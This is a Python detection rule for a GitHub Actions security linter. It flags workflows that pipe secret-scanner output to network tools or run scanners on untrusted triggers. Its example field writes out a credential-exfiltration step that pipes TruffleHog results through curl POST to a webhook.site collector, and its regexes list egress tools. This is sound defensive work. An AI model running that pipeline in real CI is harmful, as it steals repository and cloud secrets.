"""GHA-057. Secret-scanner output sent to network egress."""
from __future__ import annotations

import re
from typing import Any

from ...base import Finding, Severity
from ...rule import Rule
from ..base import iter_jobs, iter_steps, step_location, workflow_triggers

RULE = Rule(
    id="GHA-057",
    title="Secret-scanner output sent to network egress",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-4", "CICD-SEC-6"),
    esf=("ESF-D-CODE-INTEGRITY", "ESF-D-INJECTION"),
    cwe=("CWE-200", "CWE-552"),
    recommendation=(
        "Stop piping secret-scanner output to a network egress tool. "
        "Legitimate scans write their findings to the workspace, the "
        "Code Scanning API (SARIF upload), or the workflow log — none "
        "of which involve ``curl`` / ``wget`` / ``nc`` / ``gh api "
        "POST``. If the scanner is run on a fork-PR-style trigger "
        "(``pull_request_target`` / ``issue_comment`` / "
        "``workflow_run``), move it to a vanilla ``pull_request`` "
        "trigger so an attacker can't supply the scanner's "
        "configuration or scan path. Pin the scanner action to a "
        "commit SHA, not a tag, and gate the upload step behind a "
        "protected environment."
    ),
    docs_note=(
        "Two shapes fire:\n\n"
        "1. ``trufflehog`` / ``gitleaks`` invocation in a ``run:`` "
        "block whose stdout pipes to ``curl`` / ``wget`` / ``nc`` / "
        "``gh api -X POST`` — this is the harvest leg of the Shai-"
        "Hulud worm postinstall and any similar credential-stealer "
        "primitive.\n"
        "2. ``trufflehog`` / ``gitleaks`` invoked unconditionally on a "
        "workflow whose triggers include ``pull_request_target``, "
        "``issue_comment``, or ``workflow_run`` — the scanner is "
        "running with privileged secrets on an attacker-influenced "
        "trigger, so even if the output isn't piped to egress today, "
        "the next person editing the workflow can land that change "
        "via a PR comment.\n\n"
        "Legitimate uses pass: scanner output written to "
        "``${{ github.workspace }}`` or a file under the repo, output "
        "uploaded via ``github/codeql-action/upload-sarif`` (CodeQL "
        "API, not raw HTTP), and any invocation gated by a "
        "``push``-to-default-branch ``if:`` predicate."
    ),
    known_fp=(
        "Security teams that run secret scanners and POST results to "
        "their own internal SOAR / ticketing system trip the egress "
        "leg of this rule. Suppress on the specific step with a "
        "rationale that names the destination host; the rule's "
        "default posture is that any scanner-to-network pipe is "
        "credential-exfil-shaped.",
    ),
    incident_refs=(
        "Shai-Hulud npm worm (Sept 2025): the postinstall payload ran "
        "TruffleHog against the filesystem and cloud metadata "
        "endpoints, then POSTed the discovered secrets to "
        "``webhook.site/<uuid>`` and a public GitHub repo created by "
        "the worm. The TruffleHog leg is what made the secrets "
        "worth stealing; without it the worm would have nothing to "
        "exfiltrate.",
    ),
    exploit_example=(
        "# Vulnerable: the scanner harvests secrets, the pipe sends\n"
        "# them to a public collector. The Shai-Hulud postinstall\n"
        "# ran an in-line equivalent of this exact pipeline.\n"
        "jobs:\n"
        "  harvest:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@<sha>\n"
        "      - run: |\n"
        "          trufflehog filesystem . --json \\\n"
        "            | curl -X POST --data-binary @- \\\n"
        "                https://webhook.site/<uuid>\n"
        "\n"
        "# Safe: the scanner runs, output is uploaded via the\n"
        "# official Code Scanning API. No raw network egress.\n"
        "jobs:\n"
        "  scan:\n"
        "    runs-on: ubuntu-latest\n"
        "    permissions: { security-events: write }\n"
        "    steps:\n"
        "      - uses: actions/checkout@<sha>\n"
        "      - run: trufflehog filesystem . --json > findings.sarif\n"
        "      - uses: github/codeql-action/upload-sarif@<sha>\n"
        "        with: { sarif_file: findings.sarif }"
    ),
)


# Secret-scanner CLIs whose output, in a worm context, is the loot.
_SCANNER_RE = re.compile(
    r"\b(?:trufflehog|gitleaks|noseyparker|detect-secrets|ggshield)\b",
    re.IGNORECASE,
)

# Egress tools that, when fed scanner output, complete the harvest.
# ``gh api -X POST`` is included because it sends arbitrary JSON to a
# GitHub-hosted endpoint that the attacker can control (their own
# repo's issues/comments). ``aws s3 cp - s3://...`` similarly.
_EGRESS_RE = re.compile(
    r"\b(?:curl|wget|nc|ncat|httpie|http\s|"
    r"gh\s+api\s+(?:-X\s+|--method\s+)?(?:POST|PUT|PATCH)|"
    r"aws\s+s3\s+(?:cp|sync)|"
    r"gsutil\s+cp|az\s+storage\s+blob\s+upload)\b",
    re.IGNORECASE,
)

# Triggers an attacker can influence by sending a PR, issue comment,
# or by uploading a poisoned artifact that the privileged workflow_run
# consumes.
_UNTRUSTED_TRIGGERS = frozenset({
    "pull_request_target", "issue_comment", "workflow_run",
})


def _scanner_piped_to_egress(line: str) -> bool:
    """True when *line* runs a secret scanner whose stdout is piped
    to a network egress tool. Single-line check, because a multi-
    line pipe in YAML still parses as one shell line per run-block
    line.
    """
    if not _SCANNER_RE.search(line):
        return False
    # The pipe must come *after* the scanner invocation. Split on the
    # first ``|`` (but not ``||``) and look for the scanner on the
    # left, an egress tool on the right.
    parts = re.split(r"(?<!\|)\|(?!\|)", line, maxsplit=1)
    if len(parts) != 2:
        return False
    left, right = parts
    return bool(_SCANNER_RE.search(left) and _EGRESS_RE.search(right))


def _scanner_in_step(step: dict[str, Any]) -> bool:
    """True when a step's ``run:`` body or ``uses:`` references a
    secret-scanner CLI. Used to flag scanners invoked under an
    untrusted trigger even without a network-pipe."""
    run = step.get("run")
    if isinstance(run, str) and _SCANNER_RE.search(run):
        return True
    uses = step.get("uses")
    if isinstance(uses, str) and _SCANNER_RE.search(uses):
        return True
    return False


def check(path: str, doc: dict[str, Any]) -> Finding:
    triggers = set(workflow_triggers(doc))
    untrusted_trigger = bool(triggers & _UNTRUSTED_TRIGGERS)
    offenders: list[str] = []
    locations = []
    for job_id, job in iter_jobs(doc):
        for idx, step in enumerate(iter_steps(job)):
            name = step.get("name") or step.get("id") or f"steps[{idx}]"
            label: str | None = None
            run = step.get("run")
            if isinstance(run, str):
                for line in run.splitlines():
                    if _scanner_piped_to_egress(line):
                        label = "scanner output piped to network egress"
                        break
            if label is None and untrusted_trigger and _scanner_in_step(step):
                label = (
                    "secret scanner invoked under untrusted trigger "
                    f"({', '.join(sorted(triggers & _UNTRUSTED_TRIGGERS))})"
                )
            if label is None:
                continue
            offenders.append(f"{job_id}.{name}: {label}")
            locations.append(step_location(path, step))
    passed = not offenders
    desc = (
        "No secret-scanner-to-egress pattern detected."
        if passed else
        f"{len(offenders)} step(s) treat a secret scanner as a harvest "
        f"primitive: {', '.join(offenders[:5])}"
        f"{'…' if len(offenders) > 5 else ''}. Piping TruffleHog or "
        f"gitleaks output to ``curl`` / ``gh api POST`` is the "
        f"Shai-Hulud loot-extraction shape."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
    )
